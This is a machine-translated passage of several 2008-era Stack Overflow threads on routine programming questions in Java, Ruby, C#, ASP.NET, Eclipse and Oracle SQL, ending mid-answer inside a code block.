当然，在微内核中运行的大多数进程都启用了 JMX……如果您想知道单个进程的状态，就问它！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-14T15:02:32.793

感谢你的回答。

检查 JBOSS 服务器状态的一种方法是使用 TCP 套接字请求探测 JBOSS 端口（它可以是任何基本服务的端口，例如 JNDI 服务）。如果端口忙，则表示 JBOSS 已启动，否则。

我发现这是一种更可编程的检查状态的方式。:P 特别是在 Solaris OHAC 的情况下，JBOSS 将驻留在全局文件系统上。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-17T21:39:39.650

如果您对监控 JBoss 的状态以及整个系统/集群的状态感兴趣，我建议您查看[Hyperic](http://www.hyperic.com/)。

他们有一个出色的 JBoss/Tomcat 监控插件，可以监控集群内的数据库、操作系统和网络连接的状态。客户端监视器是基于 Java 的，虽然我没有在 Solaris 上测试过它，但[我相信它可以工作](http://www.hyperic.com/products/managed/solaris-management.htm)。

与其他系统监控工具相比，Hyperic 的设置相对简单，尤其是在您熟悉 JBoss 和 Java 的情况下。

好消息是 Hyperic 通过 JMX 监控 JBoss 的内部和外部状态。有了这个，您可以根据 JBoss 服务器内的条件和集群的底层基础架构构建复杂的操作。

*即，如果满足 X 和 Y 条件，请执行此操作，如果仍然存在问题，请执行此操作...*

# java - 如何获取主类的 Java 类依赖项列表？

> ID：200483
> 
> 赞同：12
> 
> 时间：2008-10-14T09:19:37.167
> 
> 标签：java, dependencies, dependency-management

有没有办法找到java主类的所有类依赖项？

我一直在手动筛选主类的导入和它的导入，但后来意识到，因为不必导入同一个包中的类，所以我整理了一个不完整的列表。

我需要一些能够递归地找到依赖关系的东西（可能达到定义的深度）。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2018-04-23T17:36:10.593

你可能想看看`jdeps`命令行工具：

[https://docs.oracle.com/javase/8/docs/technotes/tools/unix/jdeps.html](https://docs.oracle.com/javase/8/docs/technotes/tools/unix/jdeps.html)

```
jdeps -cp <your cp> -v <path to your .class file> 
```

该命令将返回该 java 类文件的依赖项列表。您可以在命令中使用许多其他选项，例如`-regex`查找与给定模式匹配的依赖项

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-10-14T10:39:17.100

我刚刚找到[Class Dependency Analyzer](http://www.dependency-analyzer.org/)，下载、安装 configure ，10 分钟后我有一个完整的类依赖列表。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-10-14T13:26:26.873

只需 javac 即可轻松完成。删除你的类文件，然后编译主类。javac 将递归编译它需要的任何类（前提是您不将包私有类/接口隐藏在奇怪命名的文件中）。当然，这不包括任何递归黑客。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-14T09:49:55.157

在[intellij 想法](http://www.jetbrains.com/idea/index.html)中，您拥有漂亮的[依赖结构矩阵](http://www.jetbrains.com/idea/features/dependency_analysis.html)。您可以完美地探索包和类级别的依赖关系。如果你喜欢它更简单，你也有一个依赖查看器，但是你只能看到一阶依赖。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-04-17T10:05:46.093

这是一个代码片段，您可以将其放入 Java 中的 main 方法中，以输出应用程序所有依赖项的路径：

```
ClassLoader cl = ClassLoader.getSystemClassLoader();
URL[] urls = ((URLClassLoader) cl).getURLs();
for(URL url: urls){
    System.out.println(url.getPath());
} 
```

# ruby - 如何使用 Ruby 找到免费的 TCP 服务器端口？

> ID：200484
> 
> 赞同：15
> 
> 时间：2008-10-14T09:20:19.520
> 
> 标签：ruby, http, sockets

我正在尝试创建一个一次性 HTTP 服务器来处理单个回调，并且需要帮助以在 Ruby 中找到一个免费的 TCP 端口。

这是我正在做的事情的骨架：

```
require 'socket'
t = STDIN.read
port = 8081
while s = TCPServer.new('127.0.0.1', port).accept
  puts s.gets
  s.print "HTTP/1.1 200/OK\rContent-type: text/plain\r\n\r\n" + t
  s.close
  exit
end 
```

（它将标准输入回显到第一个连接，然后死掉。）

我怎样才能自动找到一个空闲端口来监听？

这似乎是在远程服务器上启动作业的唯一方法，然后使用唯一的作业 ID 进行回调。然后可以查询此作业 ID 以获取状态信息。为什么最初的设计师在安排工作时不能只返回工作 ID，我永远不会知道。不能使用单个端口，因为可能会与多个回调发生冲突；这样，端口仅使用 +- 5 秒。

* * *

## 回答 #1

> 赞同：70
> 
> 时间：2008-10-14T15:00:57.977

输入 0 作为端口号。这将导致系统从临时端口范围中为您选择一个端口。创建服务器后，您可以向它询问其地址，该地址将包含服务器绑定到的端口。

```
server = TCPServer.new('127.0.0.1', 0)
port = server.addr[1] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-14T11:34:40.047

当您不尝试在一行中完成所有操作时，这实际上很容易：-/

```
require 'socket'
t = STDIN.read

port = 8080 # preferred port
begin
  server = TCPServer.new('127.0.0.1', port)    
rescue Errno::EADDRINUSE
  port = rand(65000 - 1024) + 1024
  retry
end

# Start remote process with the value of port

socket = server.accept
puts socket.gets
socket.print "HTTP/1.1 200/OK\rContent-type: text/plain\r\n\r\n" + t
socket.close 
```

这完成（强词）与问题中的片段相同。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-10-04T06:48:59.763

你可以试试[random-port](https://github.com/yegor256/random-port)，一个简单的 Ruby gem（我是作者）：

```
require 'random-port'
port = RandomPort::Pool.new.aquire 
```

不过，最好的方法是在之后发布它：

```
RandomPort::Pool::SINGLETON.new.acquire do |port|
  # Use the TCP port, it will be returned back
  # to the pool afterward.
end 
```

该池是线程安全的，它保证该端口不会被另一个线程或应用程序中的任何其他地方使用，直到它被释放。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-08-09T13:47:15.243

也许您想测试一个端口正在监听的天气，以下对我 `system('(6<>/dev/tcp/127.0.0.1/9292) &>/dev/null')`有用，如果 9292 正在监听，则返回 true，否则返回 false。

* * *

## 回答 #5

> 赞同：-8
> 
> 时间：2008-10-14T10:01:26.770

不要在随机端口上通信。选择一个默认值并使其可配置。随机端口与防火墙不兼容。FTP 做到了这一点，而防火墙对它的支持是一场噩梦——它必须深入检查数据包。

* * *

## 回答 #6

> 赞同：-9
> 
> 时间：2008-10-14T09:32:23.130

我想你可以依次尝试所有 > 5000 的端口（例如）。但是您将如何与客户端程序通信您正在侦听的端口？如果您需要在不同环境之间移动脚本，那么决定端口并使其易于配置似乎更简单。

对于 HTTP，标准端口是 80。我见过使用的替代端口是 8080、880 和 8000。

# c# - 如何从文本开始创建要嵌入 .NET 程序集的 Windows 资源？

> ID：200485
> 
> 赞同：1
> 
> 时间：2008-10-14T09:21:33.340
> 
> 标签：c#, .net, visual-studio, version-control, resource-files

不久前，我正在研究在程序集中使用[嵌入自定义版本字符串](https://stackoverflow.com/questions/120936/can-i-add-custom-version-strings-to-a-net-dll)，文档建议的一种方法是嵌入 Windows 资源。

我可以看到创建 Windows 资源的唯一方法是使用“本机资源模板”，但该模板是不适合与[subwcrev](http://tortoisesvn.net/docs/release/TortoiseSVN_en/tsvn-subwcrev.html)一起使用的二进制文件。有没有一种方法可以将 Windows 资源创建为 C# 项目的一部分，该项目以人类可编辑的文本文件开头，类似于 C++ 项目使用的 .rc 文件？如果是这样，怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-15T05:20:57.460

看来您没有 VS2005 或 VS2008 并且正在寻找创建 windows 资源。是的，“.resources”文件是二进制文件，但您可以创建一个 XML 文件或一个文本文件，将其转换为这个二进制文件。[查看ResGen](http://msdn.microsoft.com/en-us/library/ccec7sz1(VS.80).aspx)工具的文档。它适用于 .NET。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-14T09:40:36.813

In VisualStudio 2005 or 2008 (at least), you can add a new "Resources File" item to the project (located under "General" in the "Add new item" dialog). This is a simple XML file, which is perfectly human-editable - all within VisualStudio. I don't know how SubWCRev works, but if it manipulates text files, this should do it.

# asp.net - ASP.NET 主题图像

> ID：200488
> 
> 赞同：14
> 
> 时间：2008-10-14T09:22:21.450
> 
> 标签：asp.net, themes

我如何将图像设置为来自主题目录（我的主题发生了变化，所以我不想直接引用）我确信这是可能的，但我发现的每个示例似乎都不起作用。它们通常是这样的：

asp:image ID="Image1" runat="server" ImageUrl="~/Web/Mode1.jpg" /

其中 Web 将是我的主题文件夹中的子目录。建议主题目录将在运行时添加。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2008-10-14T12:52:08.377

如果您想在主题文件夹中引用图像，那么我建议使用 SkinId。在每个主题文件夹的皮肤文件中，您将定义如下内容

```
<asp:Image runat="server" SkinId="HomeImage" ImageUrl="Images/HomeImage.gif" /> 
```

当您在代码中使用图像时，您会执行以下操作...

```
<asp:Image runat="server" SkinId="HomeImage" /> 
```

根据您的应用程序选择的主题，它将从正确的主题文件夹中选择正确的图像。

```
MyWebSite
  App_Themes
    Theme1
      Default.skin
      Default.css
      Images
         HomeImage.gif
    Theme2
      Default.skin
      Default.css
      Images
         HomeImage.gif 
```

这是一篇[很好的文章](http://www.odetocode.com/articles/423.aspx)，解释了如何使用主题、皮肤以及以几种不同的方式设置主题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-23T16:46:14.110

还有其他人对这个问题有见解吗？

另一种选择是扩展基本页面。我添加了一个函数，它将根据当前主题返回图像的路径。

**MyBasePage.vb**

```
Private strThemePath As String = ""
Private strThemedImagePath As String = ""

Public Function ThemedImage(ByVal ImageName As String) As String
    Return Me.strThemedImagePath & ImageName
End Function

Private Sub Page_PreInit(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.PreInit  
    Me.strThemePath = "App_Themes/" & Me.Theme & "/"
    Me.strThemedImagePath = Me.strThemePath & "Images/"
End Sub 
```

**我的页面.aspx**

```
<img src='<%= Me.ThemedImage("Loading_wait.gif") %>'> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-10-14T11:55:01.393

不确定我是否理解您的问题，但如果您的皮肤文件中有图像，如下所示，它将默认来自主题文件夹：

```
<asp:Image runat="server" ImageUrl="filename.ext" /> 
```

如果您希望它来自主题文件夹的子文件夹 Web，请使用相对路径：

```
<asp:Image runat="server" ImageUrl="Web/filename.ext" /> 
```

您的示例指定了应用程序根目录的子文件夹：

```
<asp:image ID="Image1" runat="server" ImageUrl="~/Web/Mode1.jpg"/> 
```

请参阅[有关主题和皮肤的 MSDN 页面](http://msdn.microsoft.com/en-us/library/ykzx33wh.aspx)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-01T09:10:14.327

肯定有更简单的方法吗？例如，如果我想创建一个 HyperLink 控件，并且我想为其指定一个图像，但该图像在一个主题中，我该怎么做？我希望从 web.config （例如）控制整个应用程序的主题`<page theme="MyTheme">`，我不想为我网站中的每个项目指定一个主题。

编辑：我已经回答了我自己的问题。我在皮肤文件中创建了这个控件：

```
<asp:Hyperlink runat="Server" SkinId="HyperlinkOne"
ImageUrl="Images/one.png" Text="One" NavigateUrl="~/PageOne.aspx"/> 
```

然后在我的代码中我只是这样做：

```
HyperLink hl = new HyperLink();
hl.SkinID = "HyperlinkOne"; 
```

# .net - 在 MS Project 2003 中嵌入我的 .NET 控件

> ID：200494
> 
> 赞同：4
> 
> 时间：2008-10-14T09:23:25.397
> 
> 标签：.net, controls, ms-office, user-controls, ms-project

我需要为我的公司扩展 MS Project 的功能，所以我想在 Project 中嵌入一些 .NET GUI 控件。计划是我的控件将用户输入保存到我的自定义数据库表中，但我必须将它们绑定到任务、当前用户、资源等。你能给我一些建议如何开始吗？我对感兴趣：

*   示例应用程序/演练，如何将控件嵌入到 MS Project 中。
*   如何将我的控件的用户输入绑定到当前上下文（例如，当前选定的任务）
*   由于控件在客户端运行，我如何在企业范围内推广它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-12-02T19:02:14.443

[Add-In Express](http://www.add-in-express.com/add-in-net/ "插件快递")是一个很棒的库，用于为 MS Office 编写 .Net 插件，包括 Project。

不能说我自己在 Project 中使用过它（实际上只有 Visio），但我知道它有支持，所以可能值得一看！

它极大地简化了插件/加载项的编写，因此可能更容易查看它是否可以满足您的需求。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-31T01:09:44.800

AFAIK 你不能在 Project 中嵌入控件，你所能做的就是制作一个插件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-11-19T14:47:11.620

AFAIK，此版本的 Office 仅支持 COM 插件，因此您必须使用 COM Callable Wrapper。不过，这当然是可能的。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-11-03T17:32:11.300

我认为您想使用 Project Server。您可以定义与您的资源、任务等一起移动的企业代码。您还可以对它们进行报告、排序、过滤和所有这些好东西以及正常的项目信息（日期、资源、成本......）。

如果您没有基础设施/资金来完成所有这些工作，另一种方法是标准化您公司使用的所有项目计划，并自定义计划所基于的模板。（*工具*|*自*定义将允许您添加自定义字段，并修改默认表格。）您可以修改用于报告的表格（*查看*|*更多*表格）您可以通过这种方式进行很多自定义，并且仍然有项目计划中的所有信息，而不是分散在 mpp 文件和数据库中。

# eclipse - Visual Studio 的 Eclipse 键绑定

> ID：200499
> 
> 赞同：69
> 
> 时间：2008-10-14T09:24:43.083
> 
> 标签：eclipse, visual-studio, keyboard-shortcuts

有没有人有类似于 Eclipse 的 VS 2005 的键绑定方案？

如何将其导入 Eclipse 的首选项（我只看到导出按钮）。

* * *

## 回答 #1

> 赞同：62
> 
> 时间：2012-04-09T15:13:45.210

**如何在 Eclipse 中安装 Visual Studio 键绑定（从 Helios 开始）**

对于找到这篇文章的任何人，如果您需要分步说明并且您正在使用 Eclipse Indigo PDT，以下内容应该对您有所帮助：

（注：安装后会提示重启Eclipse）

1.  启动 Eclipse
2.  单击**帮助**->**安装新软件**
3.  在**Work with**框中选择或输入您[的 Eclipse 版本](http://wiki.eclipse.org/Older_Versions_Of_Eclipse)，例如：
    *   霓虹灯( [4.6)](http://download.eclipse.org/releases/neon/)
    *   火星[(4.5)](http://download.eclipse.org/releases/mars/)
    *   露娜( [4.4)](http://download.eclipse.org/releases/luna)
    *   开普勒( [4.3)](http://download.eclipse.org/releases/kepler)
    *   [朱诺 (4.2](http://download.eclipse.org/releases/juno) )
    *   [靛蓝 (3.7](http://download.eclipse.org/releases/indigo) )
    *   赫利俄斯( [3.6)](http://download.eclipse.org/releases/helios)
4.  确保“类型过滤器文本”框为空白。
5.  等待名称和版本列表出现
6.  向下滚动找到**Programming Languages**并展开它
7.  找到**C/C++ 开发工具**并选中该框
8.  单击**下一步**并按照屏幕上的其余说明进行操作。

完成安装并重新启动 Eclipse 后...

1.  单击窗口-> 首选项
2.  展开一般
3.  点击键
4.  将方案下拉菜单更改为 Microsoft Visual Studio
5.  点击确定

要确认更新，请尝试按`CTRL`++ ，`SHIFT`然后`F`会出现“搜索”对话框。

* * *

## 回答 #2

> 赞同：19
> 
> 时间：2009-10-03T05:18:20.507

我认为最新的 Eclipse 附带 Visual Studio 绑定，但至少 Eclipse PDT 没有（我刚刚安装）。而且我宁愿在 Eclipse 中不要有很多额外的插件来保持它更“苗条”，所以我没有添加 C++ 插件。（也许它不会影响性能，但我真的只需要钥匙......）

所以无论如何，我添加了我需要的密钥。正如之前的海报所指出的，当您在密钥自定义中“导出”时，无法导入它们，因此单独的文件->导出/导入功能是可行的方法。

所以，作为总结：

1.  尝试添加到 Eclipse C++ 插件，看看它是否附带适合您的键绑定

2.  使用我的密钥绑定，密钥列表并[在此处](http://code.vn720.com/2009/10/02/visual-studio-key-bindings-for-eclipse)下载 安装：解压缩，使用 File->Import->General... 将其下载到 Eclipse

当然，它还远未完成（它只是我错过的开始的键......），但总比没有好。

更新 (2009-10-16)：在绑定中添加了`Ctrl`+ `G`(go-to-line)。

* * *

## 回答 #3

> 赞同：18
> 
> 时间：2009-02-13T03:49:53.520

要在 Eclipse 中获取 Visual Studio 键绑定，您需要安装 C++ 开发插件 - 请参阅[此](http://www.ibm.com/developerworks/library/os-eclipse-ganymede/)。

我下载了 Eclipse 的最新 Java 开发版本（版本如下），何时帮助 -> 软件更新 -> 可用软件 -> Ganymede 并勾选 C++ 框。重新启动后，Visual Studio 键绑定出现在列表中。

```
Eclipse Platform

Version: 3.4.1
Build id: M20080911-1700 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-14T09:42:23.220

我没有 VS2005 键绑定方案，因为我个人更喜欢简要风格的方案。

但是，要导入“它”，据我所知（至少在 Eclipse 3.4 Ganymede 上）使用 File -> Import -> General -> Preferences 其中“it”是一个 .prf 文件，已使用 File -> 保存导出 -> 常规 -> 首选项。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-14T18:36:56.700

Eclipse Ganymede 有一个用于 Visual Studio 的内置键绑定方案。你试过吗？

# java - 如何告诉 Java 将逻辑字体（例如 SansSerif）映射到我系统上的特定字体？

> ID：200512
> 
> 赞同：5
> 
> 时间：2008-10-14T09:31:43.243
> 
> 标签：java, fonts

在运行 Java 程序时，有没有办法将逻辑字体（例如 SansSerif）映射到不同的字体？如果是这样，Java VM 版本之间的方法是否不同？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2008-10-14T09:41:24.797

查找`$JAVA_HOME/jre/lib/fontconfig.properties`您想要了解的有关 Java 字体映射的所有内容（嗯，几乎）。:-)

# java - run oracle sql script from java

> ID：200513
> 
> 赞同：11
> 
> 时间：2008-10-14T09:31:47.733
> 
> 标签：java, sql, oracle, scripting, inputstream

i have a bunch of sql scripts that should upgrade the database when the java web application starts up.

i tried using the ibatis scriptrunner, but it fails gloriously when defining triggers, where the ";" character does not mark an end of statement.

now i have written my own version of a script runner, which basically does the job, but destroys possible formatting and comments, especially in "create or replace view".

```
public class ScriptRunner {
private final DataSource ds;

public ScriptRunner(DataSource ds) {
    this.ds = ds;
}

public void run(InputStream sqlStream) throws SQLException, IOException {
    sqlStream.reset();
    final Statement statement = ds.getConnection().createStatement();
    List<String> sqlFragments = createSqlfragments(sqlStream);
    for (String toRun : sqlFragments) {
        if (toRun.length() > 0) {
            statement.execute(toRun);
        }
    }
}

private static List<String> createSqlfragments(InputStream sqlStream) throws IOException {
    BufferedReader br = new BufferedReader(new InputStreamReader(sqlStream));

    List<String> ret = new ArrayList<String>();
    String line;
    StringBuilder script = new StringBuilder();
    while ((line = br.readLine()) != null) {
        if (line.equals("/")) {
            ret.add(removeMultilineComments(script));
            script = new StringBuilder();
        } else {
            //strip comments
            final int indexComment = line.indexOf("--");
            String lineWithoutComments = (indexComment != -1) ? line.substring(0, indexComment) : line;
            script.append(lineWithoutComments).append(" ");
        }
    }
    if (script.length() > 0) {
        ret.add(removeMultilineComments(script));
    }
    return ret;
}

private static String removeMultilineComments(StringBuilder script) {
    return script.toString().replaceAll("/\\*(.*?)\\*/", "").trim();
} 
```

is there a clean way to acieve this? is there something in hibernate i have not seen? or can i pass an inputstream to sqlplus somehow? besides my worries about the formatting, i doubt that this code is error-free, since i have limited knowledge about the pl/sql syntax.

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2010-02-12T12:50:47.157

使用以下解决方案供您参考，我已经尝试并测试并成功运行。

```
private static String script_location = "";
private static String file_extension = ".sql";
private static ProcessBuilder processBuilder =null;

public static void main(String[] args) {
    try {
        File file = new File("C:/Script_folder");
        File [] list_files= file.listFiles(new FileFilter() {

            public boolean accept(File f) {
                if (f.getName().toLowerCase().endsWith(file_extension))
                    return true;
                return false;
            }
        });
        for (int i = 0; i<list_files.length;i++){
            script_location = "@" + list_files[i].getAbsolutePath();//ORACLE
            processBuilder = new ProcessBuilder("sqlplus",        "UserName/Password@database_name", script_location); //ORACLE
            //script_location = "-i" + list_files[i].getAbsolutePath();
            //  processBuilder = new ProcessBuilder("sqlplus", "-Udeep-Pdumbhead-Spc-de-deep\\sqlexpress-de_com",script_location);
            processBuilder.redirectErrorStream(true);
            Process process = processBuilder.start();
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String currentLine = null;
            while ((currentLine = in.readLine()) != null) {
                System.out.println(" "  + currentLine);
            }
        }
    } catch (IOException e) {
        e.printStackTrace();
    }catch(Exception ex){
        ex.printStackTrace();
    }
} 
```

使用此代码段并尝试运行。

感谢用户在以下链接中提到了解决方案：

[http://forums.sun.com/thread.jspa?threadID=5413026](http://forums.sun.com/thread.jspa?threadID=5413026)

问候 | 尼丁

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-24T08:45:01.413

iBATIS ScriptRunner 有一个`setDelimiter(String, boolean)`方法。这允许您拥有除“;”之外的字符串 作为 SQL 语句之间的分隔符。

在您的 Oracle SQL 脚本中，用“/”（斜杠）分隔语句。

在您的 Java 代码中，在调用`runScript`do a之前`setDelimter("/", false)`，它将指示 ScriptRunner 将“/”识别为语句分隔符。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2011-10-19T07:58:30.763

不久前有同样的问题，在谷歌搜索解决方案时多次碰到你的问题，所以我想我欠你 - 这是我到目前为止的发现：

简而言之，没有现成的解决方案：如果您打开[Ant](http://java2s.com/Open-Source/Java-Document-2/Database/solidbase/solidbase/core/SQLSource.java.htm)或[Maven](http://svn.codehaus.org/mojo/tags/sql-maven-plugin-1.5/src/main/java/org/codehaus/mojo/sql/SqlSplitter.java)源代码，您会看到它们使用了一个简单的基于正则表达式的脚本拆分器，这对于简单的脚本来说很好，但通常在存储过程中会失败。iBATIS、c5 db 迁移等也是如此。

问题是，涉及的语言不止一种：为了运行“SQL 脚本”，必须能够处理 (1) SQL、(2) PL/SQL 和 (3) sqlplus 命令。

运行`sqlplus`本身确实是一种方式，但它会造成配置混乱，所以我们试图避免这个选项。

有用于 PL/SQL 的 ANTLR 解析器，例如[Alexandre Porcelli 的](https://github.com/porcelli/plsql-parser)解析器——它们非常接近，但到目前为止还没有人在这些解析器的基础上准备完整的嵌入式解决方案。

我们最终编写[了另一个 ad hoc 拆分器](https://github.com/gxa/gxa/blob/9b93279d2ecda588c517dbe9dfc9f1546f4ad25a/atlas-updates/src/main/java/uk/ac/ebi/gxa/db/OracleScriptSplitter.java)，它知道一些 sqlplus 命令，比如`/`和`EXIT`- 它仍然很丑，但适用于我们的大多数脚本。（请注意，尽管某些脚本（例如，带有尾随`--`注释的脚本）不起作用——它仍然是一个组合，而不是一个解决方案。）

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-14T10:07:38.007

sqlplus : yes you can. I run sqlplus from within Xemacs(editor) all the time. So, you can run sqlplus in an interpreted mode and then provide it commands and read the output as well.

Another ways is to download the free java based SQL developer tool from oracle ([http://www.oracle.com/technology/software/products/sql/index.html](http://www.oracle.com/technology/software/products/sql/index.html)). it comes with a sqlcli.bat utility which is a wrapper over a java program. You might want to use this command line utility to do your work.

summary, I would try running sqlplus in the background and provide it's input and reading its output (like emacs does).

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-10-14T10:41:35.770

如果您想编写自己的脚本运行器，可以使用 Spring JDBC 的 SimpleJdbcTemplate ( [http://static.springframework.org/spring/docs/2.0.x/reference/jdbc.html](http://static.springframework.org/spring/docs/2.0.x/reference/jdbc.html) )。

当然，您也可以像加载 Spring 中的任何资源一样加载脚本。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-19T09:59:35.880

你可以看到其他人的实现。请参阅此资源：“Java 中的开源 SQL 客户端” [http://java-source.net/open-source/sql-clients](http://java-source.net/open-source/sql-clients)

# c# - 指定标签及其内容的正则表达式，按标签名称分组

> ID：200525
> 
> 赞同：2
> 
> 时间：2008-10-14T09:37:02.153
> 
> 标签：c#, regex, tags

这是输入（html，而不是 xml）：

```
... html content ...
<tag1> content for tag 1 </tag1>
<tag2> content for tag 2 </tag2>
<tag3> content for tag 3 </tag3>
... html content ... 
```

我想获得 3 场比赛，每场比赛有两组。第一组将包含标签的名称，第二组将包含标签的内部文本。只有这三个标签，所以它不需要是通用的。

换句话说：

```
match.Groups["name"] would be "tag1"
match.Groups["value"] would be "content for tag 2" 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-14T09:46:41.870

我不明白您为什么要为此使用匹配组名称。

这是一个正则表达式，它将标记名称和标记内容匹配为编号的子匹配项。

```
<(tag1|tag2|tag3)>(.*?)</$1> 
```

这是具有 .NET 样式组名称的变体

```
<(?'name'tag1|tag2|tag3)>(?'value'.*?)</\k'name'>. 
```

编辑

RegEx 根据问题作者的说明进行了改编。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T09:43:28.100

数据是正确的 xml，还是看起来像它？

如果是 html，那么[HTML Agility Pack](http://www.codeplex.com/htmlagilitypack)值得研究——它提供了一个 DOM（类似于 XmlDocument），您可以使用它来查询数据：

```
string input = @"<html>...some html content <b> etc </b> ...
<user> hello <b>mitch</b> </user>
...some html content <b> etc </b> ...
<message> some html <i>message</i> <a href....>bla</a> </message>
...some html content <b> etc </b> ...</html>";

            HtmlDocument doc = new HtmlDocument();
            doc.LoadHtml(input);
            foreach (HtmlNode node in doc.DocumentNode.SelectNodes("//user | //message"))
            {
                Console.WriteLine("{0}: {1}", node.Name, node.InnerText);
                // or node.InnerHtml to keep the formatting within the content
            } 
```

这输出：

```
user:  hello mitch
message:  some html message bla 
```

如果您想要格式化标签，请使用 .InnerHtml 而不是 .InnerText。

如果是 xml，那么要使用全谱 xml 进行编码，最好使用 xml 解析器。对于中小型 xml，将其加载到诸如 XmlDocument 之类的 DOM 中就可以了 - 然后查询节点（例如，“//*”）。对于巨大的 xml，XmlReader 可能是一种选择。

如果数据不必担心完整的 xml，那么一些简单的正则表达式应该不会太棘手......一个简化的例子（没有属性，没有命名空间，没有嵌套的 xml）可能是：

```
string input = @"blah <tag1> content for tag 1 </tag1> blop
<tag2> content for tag 2 </tag2> bloop
<tag3> content for tag 3 </tag3> blip";

        const string pattern = @"<(\w+)>\s*([^<>]*)\s*</(\1)>";
        Console.WriteLine(Regex.IsMatch(input, pattern));
        foreach(Match match in Regex.Matches(input, pattern)) {
            Console.WriteLine("{0}: {1}", match.Groups[1], match.Groups[2]);
        } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T09:46:14.913

正则表达式可能是：

```
/<([^>]+)>([^<]+)<\/\1>/ 
```

但这很笼统，因为我对 .NET 的转义机制知之甚少。翻译它：

*   第一组匹配 < 和 > 之间的第一个标签的名称
*   第二组匹配内容（从 > 到下一个 <
*   结束检查第一个标签是否关闭

高温高压

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-14T09:54:56.923

感谢所有但没有一个正则表达式工作。:(也许我不够具体，对此感到抱歉。这是我要解析的确切html：

```
...some html content <b> etc </b> ...
<user> hello <b>mitch</b> </user>
...some html content <b> etc </b> ...
<message> some html <i>message</i> <a href....>bla</a> </message>
...some html content <b> etc </b> ... 
```

我希望现在更清楚了。我在 USER 和 MESSAGE 标签之后。

我需要两场比赛，每场比赛有两组。第一组给我标签名称（用户或消息），第二组给我标签的整个内部文本。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-14T10:47:36.240

问题是人们用来匹配标签内的东西的 ([^<]*) 匹配嵌套标签的开始 <，然后嵌套标签的结束标签与外部标签不匹配，所以正则表达式失败。

这是 Tomalak 正则表达式的一个稍微更健壮的版本，允许属性和空格：

```
Regex tagRegex = new Regex(@"<\s*(?<tag>" + string.Join("|", tags) + @")[^>]*>(?<content>.*?)<\s*/\s*\k<tag>\s*>", RegexOptions.IgnoreCase); 
```

显然，如果您只需要使用一组特定的标签，您可以替换

```
string.Joing("|", tags) 
```

使用硬编码的管道分隔的标签列表。

正则表达式的限制是，如果您尝试匹配嵌套在另一个标签中的一个标签，它将只匹配外部标签。IE

> <user>abc<message>def</message>ghi</user>

它将匹配外部用户标签，但不匹配内部消息标签。

它也不处理在属性中引用的 >，如下所示：

> <用户属性="oops>">

它只会匹配

> <用户属性=“哎呀>

作为标签和

> ">

将成为标签内容的一部分。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-14T09:48:43.473

这将为您提供所需的命名捕获组。但是，它不适用于嵌套标签。

`/<(?<name>[^>]+)>(?<value>[^<]+)</\1>/`

# asp.net - UserHostAddress 提供了错误的 IP

> ID：200527
> 
> 赞同：11
> 
> 时间：2008-10-14T09:38:36.177
> 
> 标签：asp.net, networking, ip-address

我收集了用户访问我网站的 IP 地址的统计数据，我注意到只显示了两个 IP 地址，172.16.16.1 和 172.16.16.248。我用来确定 IP 地址的属性是

```
Request.UserHostAddress 
```

IP 地址信息丢失的原因可能是什么？所有用户都来自世界各地，因此他们不能只支持两个代理。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2008-10-14T10:30:12.313

你可能想要这样的东西；

```
string SourceIP = String.IsNullOrEmpty(Request.ServerVariables["HTTP_X_FORWARDED_FOR"]) ? Request.ServerVariables["REMOTE_ADDR"] : Request.ServerVariables["HTTP_X_FORWARDED_FOR"].Split(",")[0]; 
```

HTTP_X_FORWARDED_FOR 标头获取代理服务器后面的 IP 地址。

请参阅此页面以更详细地解释原因；[获取用户的真实 IP](http://web.archive.org/web/20150420025505/http://thepcspy.com/read/getting_the_real_ip_of_your_users/)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2008-10-14T10:04:03.800

这看起来像是反向代理的工作。当您使用反向代理时，客户端会连接到代理，而代理本身会打开与您的服务器的新连接。由于 ASP.NET 使用传入连接的信息来填充用户地址，因此您将获得反向代理的地址。

如果您确实处于此配置中，则需要反向代理的帮助才能获得正确的信息。大多数反向代理都提供了向 HTTP 请求添加标头的可能性，其中包含客户端的真实 IP 地址。检查代理的文档。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-10-31T12:04:56.383

基于戴夫安德森的回答，这里有一个片段，它考虑了一系列反向代理。

```
